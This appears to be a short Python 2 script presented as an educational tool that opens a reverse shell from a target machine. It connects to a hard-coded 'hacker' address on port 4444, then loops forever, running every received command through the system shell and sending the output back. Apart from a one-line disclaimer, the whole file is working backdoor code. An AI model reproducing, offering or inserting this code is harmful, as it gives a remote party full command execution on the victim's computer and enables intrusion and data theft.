#!/user/bin/env python
"""
Author：Seldon Pang

Establish a reverse connection from the target machine
Please use for educational purpose only...
"""

import socket
# https://docs.python.org/2/library/socket.html
import subprocess


def execute_system_command(command):
    return subprocess.check_output(command, shell=True)


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Replace ip with the ip of the 'hacker' computer
connection.connect(("192.168.1.24", 4444))
connection.send("\n[+] Connection established.\n")

while True:
    received_command = connection.recv(1024)
    command_result = execute_system_command(received_command)
    connection.send(command_result)

connection.close()
